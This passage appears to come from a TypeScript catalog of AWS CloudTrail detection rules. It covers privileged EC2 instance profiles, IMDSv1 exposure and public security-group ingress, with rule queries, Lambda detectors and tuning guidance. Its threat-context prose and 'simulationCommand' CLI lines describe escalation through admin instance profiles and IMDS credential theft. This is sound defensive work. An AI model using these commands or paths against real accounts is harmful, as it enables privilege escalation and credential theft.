        conditions: ["eventSource equals lambda.amazonaws.com", "eventName equals CreateEventSourceMapping", "requestParameters.functionName exists", "requestParameters.eventSourceArn exists", "and at least one suspicious predicate is true: actor not in approved deployment inventory, source-to-function pair not in approved mapping inventory, or source or target marked sensitive"],
        tuningGuidance: "1. Maintain an allowlist of approved deployment roles and IaC identities. 2. Build an inventory of approved source-to-function relationships. 3. Escalate when the source ARN belongs to a sensitive queue, stream, or cross-team resource, or when the target Lambda is production or security-critical.",
        whenToFire: "Fire when a new event source mapping is created outside expected deployment context or when it establishes a new or sensitive source-to-function relationship.",
      },
      simulationCommand: "aws lambda create-event-source-mapping --function-name payment-export-fn --event-source-arn arn:aws:dynamodb:us-east-1:123456789012:table/CustomerPII/stream/2026-03-17T00:00:00.000 --starting-position LATEST --enabled",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium (normal app deployments create mappings unless actor and mapping baselines are modeled)",
        expectedVolume: "Low in stable production environments; bursty during application releases",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query with approved-mapping inventory join)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda enrichment function"],
        scheduling: "Batch: every 5-15 minutes for centralized CloudTrail analytics. Real-time: EventBridge on CreateEventSourceMapping with enrichment against approved deployers and mapping inventory.",
        considerations: ["This rule is only high fidelity when backed by approved actor and approved mapping inventories.", "Treat CreateEventSourceMapping as one part of the lifecycle; also monitor UpdateEventSourceMapping and Lambda code or role changes.", "Remember that S3 notifications and EventBridge triggers are configured through different APIs and need separate coverage."],
      },
    },
  },

  // --- EC2 ---
  {
    id: "det-014",
    title: "EC2 Instance with Highly Privileged IAM Role",
    description: "Detects EC2 instances launched with IAM roles that have administrative or highly permissive policies.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EC2", "Privilege Escalation", "IAM Role"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Management instances that legitimately require elevated access"],
    rules: {
      sigma: `title: EC2 Instance with Admin IAM Role
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
  high_risk_profile:
    requestParameters.iamInstanceProfile.arn|contains:
      - 'Admin'
      - 'Administrator'
      - 'PowerUser'
      - 'Security'
      - 'OrganizationAccountAccessRole'
  condition: selection and high_risk_profile
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=RunInstances
| where like(requestParameters.iamInstanceProfile.arn, "%Admin%") OR like(requestParameters.iamInstanceProfile.arn, "%Administrator%") OR like(requestParameters.iamInstanceProfile.arn, "%PowerUser%") OR like(requestParameters.iamInstanceProfile.arn, "%Security%") OR like(requestParameters.iamInstanceProfile.arn, "%OrganizationAccountAccessRole%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.instanceType, requestParameters.iamInstanceProfile.arn, requestParameters.subnetId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.instanceType,
       requestParameters.iamInstanceProfile.arn, requestParameters.subnetId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'RunInstances'
  AND (
    requestParameters.iamInstanceProfile.arn LIKE '%Admin%'
    OR requestParameters.iamInstanceProfile.arn LIKE '%Administrator%'
    OR requestParameters.iamInstanceProfile.arn LIKE '%PowerUser%'
    OR requestParameters.iamInstanceProfile.arn LIKE '%Security%'
    OR requestParameters.iamInstanceProfile.arn LIKE '%OrganizationAccountAccessRole%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.instanceType, requestParameters.iamInstanceProfile.arn, requestParameters.subnetId, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "RunInstances"
| filter requestParameters.iamInstanceProfile.arn like /Admin|Administrator|PowerUser|Security|OrganizationAccountAccessRole/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["RunInstances"] } }, null, 2),
      lambda: `"""
EC2 Instance with Highly Privileged IAM Role
Trigger: EventBridge rule matching RunInstances.
Use for: Real-time alerting on EC2 launches with high-risk instance profiles.
"""

HIGH_RISK_PROFILE_MARKERS = ("Admin", "Administrator", "PowerUser", "Security", "OrganizationAccountAccessRole")

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "ec2.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "RunInstances":
        return {"matched": False}

    profile_arn = detail.get("requestParameters", {}).get("iamInstanceProfile", {}).get("arn", "")
    if not any(marker in profile_arn for marker in HIGH_RISK_PROFILE_MARKERS):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-014",
            "title": "EC2 Instance with Highly Privileged IAM Role",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "profile_arn": profile_arn,
            "instance_type": detail.get("requestParameters", {}).get("instanceType"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["ec2-metadata-abuse"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.iamInstanceProfile.arn", "requestParameters.instanceType", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { instanceType: "t3.micro", iamInstanceProfile: { arn: "arn:aws:iam::123456789012:instance-profile/AdminRole" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who launched the instance and which IAM profile was used.", "Inspect the instance profile for Admin or high-privilege policies.", "Verify if the instance is a management host with legitimate elevated access.", "Review IMDS configuration for credential theft risk."],
    testingSteps: ["Launch an EC2 instance with an IAM profile containing 'Admin'.", "Verify CloudTrail captures RunInstances.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Launching EC2 with a sensitive instance profile is a practical AWS privilege-escalation path because the attacker does not need to assume the role directly. They can create compute they control and retrieve the attached role credentials from IMDS.",
      threatContext: {
        attackerBehavior: "An attacker with ec2:RunInstances and the ability to pass or select an IAM instance profile launches a new EC2 instance using a role that is more privileged than the caller. After the instance starts, the attacker can access the host through SSM, SSH, user data, or a startup script and query IMDS to obtain temporary credentials for the attached role.",
        realWorldUsage: "This is a well-established AWS privilege-escalation pattern in cloud red-team tradecraft, IAM escalation research, and incident-response guidance. It commonly appears when developer, CI/CD, or platform identities can launch instances and attach roles that have broad admin, secrets, KMS, or data-plane access.",
        whyItMatters: "CloudTrail does not emit a standalone iam:PassRole event for this path, so the escalation has to be detected from the EC2 API request itself.",
        riskAndImpact: "If this goes undetected, an attacker can gain administrative control, access secrets and data stores, move laterally with the instance role, establish persistence through SSM or bootstrapped code, and continue operating even after the original user session is revoked.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for EC2)", "IAM role / instance profile inventory for enrichment"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.iamInstanceProfile.arn", "requestParameters.iamInstanceProfile.name", "requestParameters.imageId", "requestParameters.instanceType", "requestParameters.subnetId", "requestParameters.metadataOptions.httpTokens", "responseElements.instancesSet.items{}.instanceId", "sourceIPAddress", "eventTime", "recipientAccountId", "awsRegion"],
        loggingRequirements: ["CloudTrail management events must be enabled for EC2 API activity.", "The log pipeline must preserve the full requestParameters object because the instance profile reference is embedded there.", "A separate enrichment source must resolve instance profile ARN/name to the underlying IAM role and attached policies."],
        limitations: ["The CloudTrail event shows that a profile was attached, not whether the attacker successfully retrieved credentials from IMDS.", "String matching on profile names is weak; true signal quality depends on authoritative role sensitivity classification.", "Legitimate platform automation and management hosts can generate real but expected events."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail service that processed the request" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Primary trigger is RunInstances" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor launching the instance" },
          { rawPath: "requestParameters.iamInstanceProfile.arn", normalizedPath: "aws.iam.instance_profile.arn", notes: "Profile attached at launch" },
          { rawPath: "responseElements.instancesSet.items{}.instanceId", normalizedPath: "cloud.instance.id", notes: "Launched instance identifier" },
          { rawPath: "requestParameters.metadataOptions.httpTokens", normalizedPath: "aws.ec2.metadata.http_tokens", notes: "Helps assess IMDS abuse friction" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["creation"], action: "RunInstances", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1", instance: { id: "i-0abc123" } },
          aws: { iam: { instance_profile: { arn: "arn:aws:iam::123456789012:instance-profile/AdminRole" } }, ec2: { metadata: { http_tokens: "required" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Instance Profile Sensitivity", description: "Resolve the instance profile to its backing role and classify that role by effective permissions, not by name alone.", examples: ["Role has AdministratorAccess or equivalent wildcard actions", "Role can call iam:* or organizations:*", "Role can access secretsmanager:GetSecretValue"], falsePositiveReduction: "Turns a weak name-based match into a permission-sensitive signal and suppresses launches that use ordinary workload roles." },
        { dimension: "Privilege Delta", description: "Compare the caller's effective permissions with the instance profile's effective permissions.", examples: ["Developer role launches instance with org-admin profile", "CI role launches instance with security tooling role"], falsePositiveReduction: "Legitimate platform teams often launch privileged instances; the risky cases are unexpected callers or a large privilege jump." },
        { dimension: "Launch and Access Context", description: "Add context about how reachable and controllable the launched instance is, including subnet type, public IP assignment, user data, SSM manageability, and IMDS settings.", examples: ["Public subnet with auto-assigned public IP", "SSM-enabled instance", "IMDS httpTokens optional"], falsePositiveReduction: "A privileged role on an unreachable, tightly controlled instance is lower urgency than one that is easy for an attacker to access." },
        { dimension: "Workload and Business Context", description: "Map the instance to owner, environment, workload type, and expected role catalog.", examples: ["Known patching host", "Prod database maintenance instance", "Unowned instance in dev account"], falsePositiveReduction: "Expected management or automation launches can be allowlisted, while unowned or novel privileged instances stay high priority." },
      ],
      logicExplanation: {
        humanReadable: "This detection should identify RunInstances events where the attached IAM instance profile is classified as sensitive based on its effective permissions, not just its name. The engineering rationale is the same as other PassRole detections: the privilege transfer is visible only inside the downstream service API request, so EC2 launch telemetry is the correct detection point.",
        conditions: ["eventSource equals ec2.amazonaws.com", "eventName equals RunInstances", "requestParameters.iamInstanceProfile.arn or name is present", "resolved instance profile is classified as high risk based on attached permissions, role path, tags, or access to admin, security, secrets, or data-plane capabilities"],
        tuningGuidance: "1. Maintain an inventory of approved privileged instance profiles and the automation identities allowed to use them. 2. Score severity based on privilege delta. 3. Escalate when the instance is internet-reachable, SSM-manageable by broad principals, or launched with permissive IMDS settings.",
        whenToFire: "Fire whenever a new EC2 instance is launched with an instance profile classified as sensitive, especially when the actor is unexpected, the instance is reachable, or the role grants admin, secrets, or org-management access.",
      },
      simulationCommand: "aws ec2 run-instances --image-id ami-1234567890abcdef0 --instance-type t3.micro --iam-instance-profile Name=AdminInstanceProfile --subnet-id subnet-0abc123456789def0 --metadata-options \"HttpTokens=required,HttpEndpoint=enabled\"",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium (approved management hosts and platform automation can trigger until profile sensitivity and actor allowlists are in place)",
        expectedVolume: "Low in mature environments; moderate in infrastructure-heavy accounts during provisioning windows",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes for CloudTrail analytics; Real-time: EventBridge on RunInstances with Lambda enrichment against IAM and EC2 inventories.",
        considerations: ["Authoritative role sensitivity classification is the key dependency.", "Pair with adjacent coverage for AssociateIamInstanceProfile and ReplaceIamInstanceProfileAssociation.", "Correlate with IMDS exposure, SSM session starts, and unusual API use by the attached role."],
      },
    },
  },
  {
    id: "det-015",
    title: "EC2 IMDSv1 Usage Detected",
    description: "Detects EC2 instances using IMDSv1 which is vulnerable to SSRF-based credential theft.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["EC2", "IMDS", "Credential Theft"],
    logSources: ["AWS CloudTrail", "EC2 Instance Metadata"],
    falsePositives: ["Legacy applications not yet migrated to IMDSv2"],
    rules: {
      sigma: `title: EC2 IMDSv1 Usage
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_run:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
    requestParameters.metadataOptions.httpTokens: optional
  selection_modify:
    eventSource: ec2.amazonaws.com
    eventName: ModifyInstanceMetadataOptions
    requestParameters.httpTokens: optional
  condition: 1 of selection_*
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=RunInstances OR eventName=ModifyInstanceMetadataOptions)
| eval httpTokens=coalesce(requestParameters.metadataOptions.httpTokens, requestParameters.httpTokens)
| where httpTokens="optional"
| table _time, userIdentity.type, userIdentity.arn, eventName, responseElements.instancesSet.items{}.instanceId, requestParameters.instanceId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.instanceId, requestParameters.metadataOptions.httpTokens, requestParameters.httpTokens, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND (
    (eventName = 'RunInstances' AND requestParameters.metadataOptions.httpTokens = 'optional')
    OR (eventName = 'ModifyInstanceMetadataOptions' AND requestParameters.httpTokens = 'optional')
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.instanceId, requestParameters.metadataOptions.httpTokens, requestParameters.httpTokens, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter (eventName = "RunInstances" and requestParameters.metadataOptions.httpTokens = "optional") or (eventName = "ModifyInstanceMetadataOptions" and requestParameters.httpTokens = "optional")
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["RunInstances", "ModifyInstanceMetadataOptions"] } }, null, 2),
      lambda: `"""
EC2 IMDSv1 Usage Detected
Trigger: EventBridge rule matching RunInstances or ModifyInstanceMetadataOptions.
Use for: Real-time exposure detection when IMDSv2 is not enforced.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    event_name = detail.get("eventName")

    if detail.get("eventSource") != "ec2.amazonaws.com":
        return {"matched": False}

    http_tokens = None
    if event_name == "RunInstances":
        http_tokens = detail.get("requestParameters", {}).get("metadataOptions", {}).get("httpTokens")
    elif event_name == "ModifyInstanceMetadataOptions":
        http_tokens = detail.get("requestParameters", {}).get("httpTokens")

    if http_tokens != "optional":
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-015",
            "title": "EC2 IMDSv1 Usage Detected",
            "severity": "Medium",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "event_name": event_name,
            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["ec2-metadata-abuse"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.metadataOptions.httpTokens", "requestParameters.httpTokens", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { metadataOptions: { httpTokens: "optional" } }, responseElements: { instancesSet: { items: [{ instanceId: "i-xxx" }] } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify instances launched with httpTokens: optional (IMDSv1).", "Assess SSRF risk for applications on those instances.", "Plan migration to IMDSv2.", "Review instance usage for credential access attempts."],
    testingSteps: ["Launch an EC2 instance without enforcing IMDSv2.", "Verify CloudTrail shows metadataOptions.httpTokens.", "Run the detection to confirm it triggers on optional tokens."],
    lifecycle: {
      whyItMatters: "IMDSv1 exposure is one of the most practical precursor signals for EC2 credential theft. It does not prove an attacker already stole credentials, but it identifies instances where SSRF or code execution can be converted into role-credential access with minimal friction.",
      threatContext: {
        attackerBehavior: "An attacker who gains code execution on an EC2 instance, or who exploits SSRF in an application running on that instance, can query the metadata endpoint at 169.254.169.254 to retrieve temporary IAM role credentials. When IMDSv1 remains enabled, the metadata service accepts simple unauthenticated requests, which makes credential theft substantially easier than on IMDSv2-only instances.",
        realWorldUsage: "Credential theft from EC2 metadata services is a well-known cloud attack path and was central to several widely discussed AWS breaches, including Capital One's SSRF-driven compromise. AWS and GuardDuty guidance also treat off-instance use of EC2 role credentials as a meaningful threat scenario worth dedicated detection coverage.",
        whyItMatters: "The initial metadata retrieval is usually invisible to CloudTrail, so defenders benefit from exposure detection that flags instances where the attack path is open before credentials are abused.",
        riskAndImpact: "A compromised instance role can be used to access data, call privileged APIs, move laterally, create persistence, or operate from outside the original instance if the credentials are exfiltrated.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for EC2)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.metadataOptions.httpTokens", "requestParameters.httpTokens", "requestParameters.instanceId", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail management events must include EC2 RunInstances and ModifyInstanceMetadataOptions", "The logging pipeline must preserve metadata options fields from requestParameters", "GuardDuty can provide complementary detection for actual instance-credential exfiltration but is not required for this exposure rule"],
        limitations: ["This rule detects IMDSv1 exposure, not the metadata fetch itself", "Actual IMDS credential retrieval from 169.254.169.254 is not logged in CloudTrail", "Some legacy workloads intentionally run with httpTokens=optional and require exception handling"],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "EC2 API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Instance launch or metadata option change" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor configuring the instance" },
          { rawPath: "requestParameters.metadataOptions.httpTokens", normalizedPath: "aws.ec2.metadata.http_tokens", notes: "RunInstances metadata configuration" },
          { rawPath: "requestParameters.httpTokens", normalizedPath: "aws.ec2.metadata.http_tokens", notes: "ModifyInstanceMetadataOptions path" },
          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Existing instance being modified" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "RunInstances", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, instance: { id: "i-0abc123" } },
          aws: { ec2: { metadata: { http_tokens: "optional" } } },
        }, null, 2),
      },
      enrichment: [
        {
          dimension: "Instance Role Sensitivity",
          description: "Classify the IAM role attached to the instance to determine whether IMDS exposure could yield broad data, admin, or security-tool access.",
          examples: ["Role can read S3 data lake", "Role has secretsmanager:GetSecretValue", "Role attached to management instance"],
          falsePositiveReduction: "Prioritizes truly dangerous IMDS exposure over low-privilege or sandbox instances.",
        },
        {
          dimension: "Workload SSRF / RCE Exposure",
          description: "Combine with application exposure context such as public-facing web services, known SSRF risk, or internet accessibility.",
          examples: ["Internet-facing ALB target", "Known SSRF-prone application", "Public subnet web tier"],
          falsePositiveReduction: "Elevates instances where IMDSv1 is realistically exploitable rather than merely misconfigured.",
        },
        {
          dimension: "Lifecycle and Exception Context",
          description: "Track whether the instance belongs to a golden image pipeline, temporary test environment, or approved legacy exception list.",
          examples: ["AMI build account", "Legacy workload exception", "Migration waiver expires in 30 days"],
          falsePositiveReduction: "Reduces repeated alerts from known transitional workloads while preserving visibility.",
        },
        {
          dimension: "Credential Misuse Correlation",
          description: "Correlate with GuardDuty InstanceCredentialExfiltration findings or anomalous API use from the instance role shortly after launch or configuration changes.",
          examples: ["GuardDuty UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration", "GetCallerIdentity from unusual IP", "Cross-account role usage from instance credentials"],
          falsePositiveReduction: "Turns posture exposure into a higher-confidence incident when abuse signals appear.",
        },
      ],
      logicExplanation: {
        humanReadable: "This detection flags EC2 instances that are launched or modified with IMDS token usage set to optional, which means IMDSv1 remains available. The rule is intentionally framed as exposure detection rather than theft detection: CloudTrail shows when the risky configuration is created, but not when an attacker actually queries the metadata endpoint. Covering both RunInstances and ModifyInstanceMetadataOptions matters because insecure metadata settings can be introduced at launch or downgraded after the instance already exists. In production, this rule should feed both security monitoring and hardening workflows, and it becomes more valuable when combined with role-sensitivity enrichment and GuardDuty exfiltration findings.",
        conditions: [
          "eventSource equals ec2.amazonaws.com",
          "eventName equals RunInstances and requestParameters.metadataOptions.httpTokens equals optional",
          "or eventName equals ModifyInstanceMetadataOptions and requestParameters.httpTokens equals optional",
        ],
        tuningGuidance: "1. Maintain explicit exception lists for legacy workloads that cannot yet enforce IMDSv2. 2. Raise severity when the instance profile is sensitive, the workload is internet-facing, or the instance sits in a production subnet. 3. Pair this exposure detector with downstream credential-misuse detections such as GuardDuty InstanceCredentialExfiltration findings or anomalous role API usage.",
        whenToFire: "Fire whenever a new or existing instance is configured with httpTokens=optional. Even if the workload is legitimate, the configuration materially increases the likelihood of SSRF-driven credential theft and should be reviewed or remediated.",
      },
      simulationCommand: "aws ec2 run-instances --image-id ami-1234567890abcdef0 --instance-type t3.micro --iam-instance-profile Name=WebRole --metadata-options \"HttpTokens=optional,HttpEndpoint=enabled\"",
      quality: {
        signalQuality: 6,
        falsePositiveRate: "Medium (legacy or transitional workloads may intentionally allow IMDSv1)",
        expectedVolume: "Low to moderate depending on migration status and EC2 launch frequency",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes; Real-time: EventBridge on RunInstances and ModifyInstanceMetadataOptions",
        considerations: ["This is best treated as an exposure signal feeding hardening workflows", "GuardDuty should be considered a complementary control for actual off-instance credential use", "Account-level IMDSv2 enforcement can reduce launch-time noise by preventing insecure launches entirely"],
      },
    },
  },
  {
    id: "det-016",
    title: "EC2 Security Group Opened to 0.0.0.0/0",
    description: "Detects when an EC2 security group is modified to allow inbound traffic from any IP address.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "Security Group", "Network"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Public-facing web servers with intentional open access"],
    rules: {
      sigma: `title: EC2 Security Group Opened to All
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: AuthorizeSecurityGroupIngress
    requestParameters.ipPermissions.items{}.ipRanges.items{}.cidrIp: '0.0.0.0/0'
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=AuthorizeSecurityGroupIngress
| where like(requestParameters, "%0.0.0.0/0%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.groupId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.groupId, requestParameters.ipPermissions, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'AuthorizeSecurityGroupIngress'
  AND requestParameters LIKE '%0.0.0.0/0%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.groupId, requestParameters.ipPermissions, sourceIPAddress
| filter eventName = "AuthorizeSecurityGroupIngress"
| filter requestParameters like /0\\.0\\.0\\.0\\/0/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["AuthorizeSecurityGroupIngress"] } }, null, 2),
      lambda: `"""
EC2 Security Group Opened to 0.0.0.0/0
Trigger: EventBridge rule matching AuthorizeSecurityGroupIngress.
Use for: Real-time alerting on public IPv4 ingress exposure.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "ec2.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "AuthorizeSecurityGroupIngress":
        return {"matched": False}

    permissions = str(detail.get("requestParameters", {}).get("ipPermissions", ""))
    if "0.0.0.0/0" not in permissions:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-016",
            "title": "EC2 Security Group Opened to 0.0.0.0/0",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "group_id": detail.get("requestParameters", {}).get("groupId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.groupId", "requestParameters.ipPermissions", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "AuthorizeSecurityGroupIngress", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { groupId: "sg-xxx", ipPermissions: { items: [{ ipRanges: { items: [{ cidrIp: "0.0.0.0/0" }] } }] } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who modified the security group.", "Verify if 0.0.0.0/0 was intentionally added (e.g., web server).", "Review the affected instances and exposed ports.", "Check for lateral movement or data exfiltration risk."],
    testingSteps: ["Add an ingress rule with 0.0.0.0/0 to a security group.", "Verify CloudTrail captures AuthorizeSecurityGroupIngress.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Opening a security group to 0.0.0.0/0 is a high-value network exposure signal because it can instantly make existing workloads reachable from the entire internet. The real risk depends on what port and protocol were opened and whether the security group is attached to internet-reachable assets.",
      threatContext: {
        attackerBehavior: "An attacker with ec2:AuthorizeSecurityGroupIngress adds an ingress rule that allows traffic from 0.0.0.0/0 to a security group. This is commonly used to expose SSH, RDP, database, cache, or internal application ports so the attacker can gain direct access or stage follow-on exploitation and persistence.",
        realWorldUsage: "Security-group exposure changes are a common post-compromise and misconfiguration pattern in cloud environments. Attackers and red teams frequently open port 22 or 3389 for direct access, while exposure of database and application ports is used to enable lateral movement or public exploitation of previously internal services.",
        whyItMatters: "CloudTrail records the exact moment the exposure is created, which gives defenders a reliable control-plane signal before internet scanning or exploitation begins.",
        riskAndImpact: "If the affected security group is attached to instances, ENIs, or load balancers on reachable network paths, the change can expose management services, sensitive applications, or data-plane ports to the internet.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for EC2)", "EC2 / VPC inventory for security-group attachment enrichment"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.groupId", "requestParameters.groupName", "requestParameters.ipPermissions.items{}.ipProtocol", "requestParameters.ipPermissions.items{}.fromPort", "requestParameters.ipPermissions.items{}.toPort", "requestParameters.ipPermissions.items{}.ipRanges.items{}.cidrIp", "sourceIPAddress", "eventTime", "recipientAccountId", "awsRegion"],
        loggingRequirements: ["CloudTrail management events must be enabled for EC2 API activity.", "The logging pipeline must preserve nested ipPermissions arrays.", "To distinguish benign public services from dangerous exposure, enrichment should resolve the security group to attached ENIs, instances, and load balancers."],
        limitations: ["The CloudTrail event shows a configuration change, not whether a service was actually listening or reachable from the internet.", "A rule opened to 0.0.0.0/0 may be low risk if the security group is unattached or only protects an approved public web service.", "The current baseline scope does not cover IPv6 ::/0 unless explicitly added."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "EC2 API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Primary trigger is AuthorizeSecurityGroupIngress" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor who opened the rule" },
          { rawPath: "requestParameters.groupId", normalizedPath: "aws.ec2.security_group.id", notes: "Target security group" },
          { rawPath: "requestParameters.ipPermissions.items{}.fromPort", normalizedPath: "aws.ec2.security_group.ingress[].port_start", notes: "Beginning of exposed port range" },
          { rawPath: "requestParameters.ipPermissions.items{}.toPort", normalizedPath: "aws.ec2.security_group.ingress[].port_end", notes: "End of exposed port range" },
          { rawPath: "requestParameters.ipPermissions.items{}.ipRanges.items{}.cidrIp", normalizedPath: "aws.ec2.security_group.ingress[].cidr_ipv4", notes: "Detect 0.0.0.0/0 exposure" },
        ],
